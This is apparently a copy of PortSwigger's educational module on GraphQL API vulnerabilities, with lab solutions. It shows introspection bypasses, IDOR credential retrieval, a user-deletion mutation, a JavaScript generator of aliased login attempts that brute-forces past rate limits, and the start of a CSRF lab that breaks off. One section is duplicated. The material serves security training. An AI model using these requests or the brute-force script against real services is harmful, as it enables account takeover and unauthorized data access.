# Original PortSwigger GraphQL Content

> This file preserves the complete source content supplied for this module. The explanatory files in this folder reorganize the same material into a study-friendly structure and add explanations where useful.

```text
GraphQL API vulnerabilities
GraphQL vulnerabilities generally arise due to implementation and design flaws. For example, the introspection feature may be left active, enabling attackers to query the API in order to glean information about its schema.

GraphQL attacks usually take the form of malicious requests that can enable an attacker to obtain data or perform unauthorized actions. These attacks can have a severe impact, especially if the user is able to gain admin privileges by manipulating queries or executing a CSRF exploit. Vulnerable GraphQL APIs can also lead to information disclosure issues.

In this section we'll look at how to test GraphQL APIs. Don't worry if you're not familiar with GraphQL - we'll cover the relevant details as we go. We've also provided some labs so you can practice what you've learned.

GraphQL example
More information
To find out what GraphQL is and how it works, see our What is GraphQL Web Security Academy page.

What is GraphQL?
GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.

GraphQL services define a contract through which a client can communicate with a server. The client doesn't need to know where the data resides. Instead, clients send queries to a GraphQL server, which fetches data from the relevant places. As GraphQL is platform-agnostic, it can be implemented with a wide range of programming languages and can be used to communicate with virtually any data store.

Note
This page offers an overview of what GraphQL is and how it works. For specific information on how to test for GraphQL vulnerabilities, see GraphQL API vulnerabilities.

How GraphQL works
GraphQL schemas define the structure of the service's data, listing the available objects (known as types), fields, and relationships.

The data described by a GraphQL schema can be manipulated using three types of operation:

Queries fetch data.
Mutations add, change, or remove data.
Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.
All GraphQL operations use the same endpoint, and are generally sent as a POST request. This is significantly different to REST APIs, which use operation-specific endpoints across a range of HTTP methods. With GraphQL, the type and name of the operation define how the query is handled, rather than the endpoint it is sent to or the HTTP method used.

GraphQL services generally respond to operations with a JSON object in the structure requested.

What is a GraphQL schema?
In GraphQL, the schema represents a contract between the frontend and backend of the service. It defines the data available as a series of types, using a human-readable schema definition language. These types can then be implemented by a service.

Most of the types defined are object types, which define the objects available and the fields and arguments they have. Each field has its own type, which can either be another object or a scalar, enum, union, interface, or custom type.

The example below shows a simple schema definition for a Product type. The ! operator indicates that the field is non-nullable when called (that is, mandatory).


    #Example schema definition

    type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }

Schemas must also include at least one available query. Usually, they also contain details of available mutations.

What are GraphQL queries?
GraphQL queries retrieve data from the data store. They are roughly equivalent to GET requests in a REST API.

Queries usually have the following key components:

A query operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
A data structure. This is the data that the query should return.
Optionally, one or more arguments. These are used to create queries that return details of a specific object (for example "give me the name and description of the product that has the ID 123").
The example below shows a query called myGetProductQuery that requests the name, and description fields of a product with the id of 123.


    #Example query

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }

Note that the product type may contain more fields in the schema than those requested here. The ability to request only the data you need is a significant part of the flexibility of GraphQL.

What are GraphQL mutations?
Mutations change data in some way, either adding, deleting, or editing it. They are roughly equivalent to a REST API's POST, PUT, and DELETE methods.

Like queries, mutations have an operation type, name, and structure for the returned data. However, mutations always take an input of some type. This can be an inline value, but in practice is generally provided as a variable.

The example below shows a mutation to create a new product and its associated response. In this case, the service is configured to automatically assign an ID to new products, which has been returned as requested.


    #Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }


    #Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }

Components of queries and mutations
The GraphQL syntax includes several common components for queries and mutations.

Fields
All GraphQL types contain items of queryable data called fields. When you send a query or mutation, you specify which of the fields you want the API to return. The response mirrors the content specified in the request.

The example below shows a query to get ID and name details for all employees, and its associated response. In this case, id, name.firstname, and name.lastname are the fields requested.


    #Request

    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }


    #Response

    {
        "data": {
            "getEmployees": [
                {
                    "id": 1,
                    "name" {
                        "firstname": "Carlos",
                        "lastname": "Montoya"
                    }
                },
                {
                    "id": 2,
                    "name" {
                        "firstname": "Peter",
                        "lastname": "Wiener"
                    }
                }
            ]
        }
    }

Arguments
Arguments are values that are provided for specific fields. The arguments that can be accepted for a type are defined in the schema.

When you send a query or mutation that contains arguments, the GraphQL server determines how to respond based on its configuration. For example, it might return a specific object rather than details of all objects.

The example below shows a getEmployee request that takes an employee ID as an argument. In this case, the server responds with only the details of the employee who matches that ID.


    #Example query with arguments

    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }


    #Response to query

    {
        "data": {
            "getEmployees": [
            {
                "name" {
                    "firstname": Carlos,
                    "lastname": Montoya
                    }
                }
            ]
        }
    }

Note
If user-supplied arguments are used to access objects directly then a GraphQL API can be vulnerable to access control vulnerabilities such as insecure direct object references (IDOR).

Variables
Variables enable you to pass dynamic arguments, rather than having arguments directly within the query itself.

Variable-based queries use the same structure as queries using inline arguments, but certain aspects of the query are taken from a separate JSON-based variables dictionary. They enable you to reuse a common structure among multiple queries, with only the value of the variable itself changing.

When building a query or mutation that uses variables, you need to:

Declare the variable and type.
Add the variable name in the appropriate place in the query.
Pass the variable key and value from the variable dictionary.
The example below shows the same query as in the previous example, but with the ID passed as a variable instead of as a direct part of the query string.


    #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }

In this example, the variable is declared in the first line with ($id: ID!). The ! indicates that this is a required field for this query. It is then used as an argument in the second line with (id:$id). Finally, the value of the variable itself is set in the variable JSON dictionary. For information on how to test for these vulnerabilities, see GraphQL API vulnerabilities.

Aliases
GraphQL objects can't contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.


    #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }

Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. This helps to reduce the number of API calls needed.

In the example below, the query uses aliases to specify a unique name for both products. This query now passes validation, and the details are returned.


    #Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }


    #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }

Note
Using aliases with mutations effectively enables you to send multiple GraphQL messages in one HTTP request.

For more information on how to use this technique to bypass some rate limit controls, see Bypassing rate limiting using aliases.

Fragments
Fragments are reusable parts of queries or mutations. They contain a subset of the fields belonging to the associated type.

Once defined, they can be included in queries or mutations. If they are subsequently changed, the change is included in every query or mutation that calls the fragment.

The example below shows a getProduct query in which the details of the product are contained in a productInfo fragment.


    #Example fragment

    fragment productInfo on Product {
        id
        name
        listed
    }


    #Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }


    #Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extractor",
                "listed": "no",
                "stock": 5
            }
        }
    }

Subscriptions
Subscriptions are a special type of query. They enable clients to establish a long-lived connection with a server so that the server can then push real-time updates to the client without the need to continually poll for data. They are primarily useful for small changes to large objects and for functionality that requires small real-time updates (like chat systems or collaborative editing).

As with regular queries and mutations, the subscription request defines the shape of the data to be returned.

Subscriptions are commonly implemented using WebSockets.

Introspection
Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.

Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.

Introspection can represent a serious information disclosure risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.

Finding GraphQL endpoints
Before you can test a GraphQL API, you first need to find its endpoint. As GraphQL APIs use the same endpoint for all requests, this is a valuable piece of information.

Note
This section explains how to probe for GraphQL endpoints manually. However, Burp Scanner can automatically test for GraphQL endpoints as part of its scans. It raises a "GraphQL endpoint found" issue if any such endpoints are discovered.

Universal queries
If you send query{__typename} to any GraphQL endpoint, it will include the string {"data": {"__typename": "query"}} somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called __typename that returns the queried object's type as a string.

Common endpoint names
GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path.

Note
GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.

Request methods
The next step in trying to find GraphQL endpoints is to test using different request methods.

It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of application/json, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of x-www-form-urlencoded.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.

Initial testing
Once you have discovered the endpoint, you can send some test requests to understand a little more about how it works. If the endpoint is powering a website, try exploring the web interface in Burp's browser and use the HTTP history to examine the queries that are sent.


Exploiting unsanitized arguments
At this point, you can start to look for vulnerabilities. Testing query arguments is a good place to start.

If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR).

More information
For a general explanation of GraphQL arguments, see Arguments.
For further information on IDORs, see Insecure direct object references (IDOR).
For example, the query below requests a product list for an online shop:


    #Example product query

    query {
        products {
            id
            name
            listed
        }
    }

The product list returned contains only listed products.


    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }

From this information, we can infer the following:

Products are assigned a sequential ID.
Product ID 3 is missing from the list, possibly because it has been delisted.
By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.


    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }


    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }



Exploiting unsanitized arguments
At this point, you can start to look for vulnerabilities. Testing query arguments is a good place to start.

If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR).

More information
For a general explanation of GraphQL arguments, see Arguments.
For further information on IDORs, see Insecure direct object references (IDOR).
For example, the query below requests a product list for an online shop:


    #Example product query

    query {
        products {
            id
            name
            listed
        }
    }

The product list returned contains only listed products.


    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }

From this information, we can infer the following:

Products are assigned a sequential ID.
Product ID 3 is missing from the list, possibly because it has been delisted.
By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.


    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }


    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }

Discovering schema information
The next step in testing the API is to piece together information about the underlying schema.

The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

Introspection helps you to understand how you can interact with a GraphQL API. It can also disclose potentially sensitive data, such as description fields.

Using introspection
To use introspection to discover schema information, query the __schema field. This field is available on the root type of all queries.

Like regular queries, you can specify the fields and structure of the response you want to be returned when running an introspection query. For example, you might want the response to contain only the names of available mutations.

Note
Burp can generate introspection queries for you. For more information, see Accessing GraphQL API schemas using introspection.

Probing for introspection
It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.


    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }

Note
Burp Scanner can automatically test for introspection during its scans. If it finds that introspection is enabled, it reports a "GraphQL introspection enabled" issue.

Running a full introspection query
The next step is to run a full introspection query against the endpoint so that you can get as much information on the underlying schema as possible.

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.


    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

Note
If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

Visualizing introspection results
Responses to introspection queries can be full of information, but are often very long and hard to process.

You can view relationships between schema entities more easily using a GraphQL visualizer. This is an online tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types.

Suggestions
Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.

Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

Clairvoyance is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.

In Apollo Server v4 and above, you can disable suggestions using the hideSchemaDetailsFromClientErrors option. For earlier versions, see this GitHub thread for a workaround.

Note
Burp Scanner can automatically test for suggestions as part of its scans. If active suggestions are found, Burp Scanner reports a "GraphQL suggestions enabled" issue.


#Lab01 :  Accessing private GraphQL posts
The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.
Learn more about Working with GraphQL in Burp Suite.

Solution
Identify the vulnerability
In Burp's browser, access the blog page.
In Burp, go to Proxy > HTTP history and notice the following:
Blog posts are retrieved using a GraphQL query.
In the response to the GraphQL query, each blog post has its own sequential id.
Blog post id 3 is missing from the list. This indicates that there is a hidden blog post.
Find the POST /graphql/v1 request. Right-click it and select Send to Repeater.
In Repeater, right-click anywhere in the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.
Send the request. Notice in the response that the BlogPost type has a postPassword field available.

Exploit the vulnerability to find the password
In the HTTP history, find the POST /graphql/v1 request. Right-click it and select Send to Repeater.
In Repeater, click on the GraphQL tab. In the Variables panel, modify the id variable to 3 (the ID of the hidden blog post).
In the Query panel, add the postPassword field to the query.
Send the request.
Copy the contents of the response's postPassword field and paste them into the Submit solution dialog to solve the lab. You may need to refresh the page.




#Lab02 :  Accidental exposure of private GraphQL fields
The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.
To solve the lab, sign in as the administrator and delete the username carlos.
Learn more about Working with GraphQL in Burp Suite.


Analysis : 
Identify the vulnerability
In Burp's browser, access the lab and select My account.

Attempt to log in to the site.

In Burp, go to Proxy > HTTP history and notice that the login attempt is sent as a GraphQL mutation containing a username and password.

Right-click the login request and select Send to Repeater.

In Repeater, right-click anywhere within the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.

Send the request.

Right-click the message and select GraphQL > Save GraphQL queries to site map.

Go to Target > Site map and review the GraphQL queries. Notice the following:

There is a getUser query that returns a user's username and password.
This query fetches the relevant user information via a direct reference to an id number.
Modify the query to retrieve the administrator credentials

Right-click the the getUser query and select Send to Repeater.

In Repeater, click Send. Notice that the default id value of 0 doesn't return a user.

Select the GraphQL tab and test alternative values for the id variable until the API returns the administrator's credentials. In this case, the administrator's ID is 1.

Log in to the site as the administrator, go to the Admin panel, and delete carlos to solve the lab.



#Bypassing GraphQL introspection defenses
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.

When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded __schema{, then the below introspection query would not be excluded.


    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of x-www-form-urlencoded.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.


    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

Note
You can save GraphQL queries to the site map. For more information, see Working with GraphQL.


#Lab03 :  Finding a hidden GraphQL endpoint
PRACTITIONER

LAB
Solved
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos.

Learn more about Working with GraphQL in Burp Suite.

ACCESS THE LAB
Solution
Find the hidden GraphQL endpoint

In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.

Note that when you send a GET request to /api the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.

Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.

For example: /api?query=query{__typename}.

Notice that the response confirms that this is a GraphQL endpoint:

{
  "data": {
    "__typename": "query"
  }
}
                                
Overcome the introspection defenses

Send a new request with a URL-encoded introspection query as a query parameter.

To do this, right-click the request and select GraphQL > Set introspection query:


/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
                                
Notice from the response that introspection is disallowed.

Modify the query to include a newline character after __schema and resend.

For example:


/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
                                
Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{", which the query no longer matches even though it is still a valid introspection query.

Exploit the vulnerability to delete carlos

Right-click the request and select GraphQL > Save GraphQL queries to site map.

Go to Target > Site map to see the API queries. Use the GraphQL tab and find the getUser query. Right-click the request and select Send to Repeater.

In Repeater, send the getUser query to the endpoint you discovered.

Notice that the response returns:

{
"data": {
"getUser": null
}
}
Click on the GraphQL tab and change the id variable to find carlos's user ID. In this case, the relevant user ID is 3.

In Target > Site map, browse the schema again and find the deleteOrganizationUser mutation. Notice that this mutation takes a user ID as a parameter.

Send the request to Repeater.

In Repeater, send a deleteOrganizationUser mutation with a user ID of 3 to delete carlos and solve the lab.

For example:


    /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
                                



#Bypassing rate limiting using aliases
Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.

More information
For more information on GraphQL aliases, see Aliases.

While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint.

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.


    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isValidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }


#Lab04 : Bypassing GraphQL brute force protections
PRACTITIONER

LAB
Not solved
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

Learn more about Working with GraphQL in Burp Suite.

Tip
This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

Open the lab in Burp's browser.
Right-click the page and select Inspect.
Select the Console tab.
Paste the script and press Enter.
You can then use the generated aliases when crafting your request in Repeater.


copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
                        
ACCESS THE LAB
Solution
In Burp's browser, access the lab and select My account.

Attempt to log in to the site using incorrect credentials.

In Burp, go to Proxy > HTTP history. Note that login requests are sent as a GraphQL mutation.

Right-click the login request and select Send to Repeater.

In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.

In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.

Bear the following in mind when constructing your request:

The list of aliases should be contained within a mutation {} type.
Each aliased mutation should have the username carlos and a different password from the authentication list.
If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending. You can do this from Repeater's Pretty tab.
Ensure that each alias requests the success field, as shown in the simplified example below:

    mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
                                
Click Send.

Notice that the response lists each login attempt and whether its login attempt was successful.

Use the search bar below the response to search for the string true. This indicates which of the aliased mutations was able to successfully log in as carlos.

Check the request for the password that was used by the successful alias.

Log in to the site using the carlos credentials to solve the lab.



#GraphQL CSRF
Cross-site request forgery (CSRF) vulnerabilities enable an attacker to induce users to perform actions that they do not intend to perform. This is done by creating a malicious website that forges a cross-domain request to the vulnerable application.

More information
For more information on CSRF vulnerabilities in general, see the CSRF academy topic.

GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user.

How do CSRF over GraphQL vulnerabilities arise?
CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.

The steps to construct a CSRF attack and deliver an exploit are the same for GraphQL-based CSRF vulnerabilities as they are for "regular" CSRF vulnerabilities. For more information on this process, see How to construct a CSRF attack.



#Lab05 :
Performing CSRF exploits over GraphQL
PRACTITIONER

LAB
Not solved
The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter.

Learn more about Working with GraphQL in Burp Suite.

ACCESS THE LAB
Solution
Open Burp's browser, access the lab and log in to your account.

Enter a new email address, then click Update email.

In Burp, go to Proxy > HTTP history and check the resulting request. Note that the email change is sent as a GraphQL mutation.

Right-click the email change request and select Send to Repeater.

In Repeater, amend the GraphQL query to change the email to a second different address.

Click Send.

In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.

Convert the request into a POST request with a Content-Type of x-www-form-urlencoded. To do this, right-click the request and select Change request method twice.

Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.

The body should look like the below:


